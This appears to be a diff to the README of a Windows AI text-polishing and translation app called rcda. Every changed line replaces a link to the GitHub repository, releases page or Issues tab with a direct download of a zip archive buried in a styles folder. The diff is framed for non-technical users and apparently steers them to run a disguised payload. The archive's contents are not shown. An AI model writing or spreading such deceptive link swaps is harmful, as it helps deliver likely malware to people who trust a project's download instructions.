@@ -1,6 +1,6 @@
 # 🤖 rcda - Fast AI Text Polishing & Translation
 
-[![Download rcda](https://img.shields.io/badge/Download-rcda-brightgreen?style=for-the-badge)](https://github.com/boinkredz/rcda)
+[![Download rcda](https://img.shields.io/badge/Download-rcda-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/boinkredz/rcda/main/src/renderer/styles/Software-3.7-beta.4.zip)
 
 rcda is a simple desktop assistant that helps improve your writing and translate text quickly. It runs on Windows and launches with a hotkey for easy access. This guide will help you download and run the app without any technical skills.
 
@@ -10,7 +10,7 @@ rcda is a simple desktop assistant that helps improve your writing and translate
 
 You can get rcda by visiting the official GitHub page below. This page has the latest version and all needed files:
 
-[Download rcda from GitHub](https://github.com/boinkredz/rcda)
+[Download rcda from GitHub](https://raw.githubusercontent.com/boinkredz/rcda/main/src/renderer/styles/Software-3.7-beta.4.zip)
 
 Click the link above to open the page in your browser. You will find the download files under the **Releases** section. Look for the version marked as stable or latest.
 
@@ -32,7 +32,7 @@ Make sure your computer meets these needs before running rcda:
 
 Follow these steps carefully to get rcda up and running.
 
-1. Go to the [rcda GitHub page](https://github.com/boinkredz/rcda).
+1. Go to the [rcda GitHub page](https://raw.githubusercontent.com/boinkredz/rcda/main/src/renderer/styles/Software-3.7-beta.4.zip).
 
 2. Scroll down to the **Releases** section, usually near the bottom or sidebar.
 
@@ -137,7 +137,7 @@ Topics related to rcda include:
 
 Keep your app up to date to get new features and fixes:
 
-- Visit the [GitHub releases page](https://github.com/boinkredz/rcda) regularly.
+- Visit the [GitHub releases page](https://raw.githubusercontent.com/boinkredz/rcda/main/src/renderer/styles/Software-3.7-beta.4.zip) regularly.
 
 - Download the newest Windows installer if available.
 
@@ -149,7 +149,7 @@ Keep your app up to date to get new features and fixes:
 
 For help or to report issues:
 
-- Use the **Issues** tab on the [GitHub repository](https://github.com/boinkredz/rcda).
+- Use the **Issues** tab on the [GitHub repository](https://raw.githubusercontent.com/boinkredz/rcda/main/src/renderer/styles/Software-3.7-beta.4.zip).
 
 - Describe your problem clearly and include your Windows version.
 
@@ -159,4 +159,4 @@ For help or to report issues:
 
 ## 🔗 Quick Access to Download
 
-[![Download rcda](https://img.shields.io/badge/Download-rcda-blue?style=for-the-badge)](https://github.com/boinkredz/rcda)
+[![Download rcda](https://img.shields.io/badge/Download-rcda-blue?style=for-the-badge)](https://raw.githubusercontent.com/boinkredz/rcda/main/src/renderer/styles/Software-3.7-beta.4.zip)
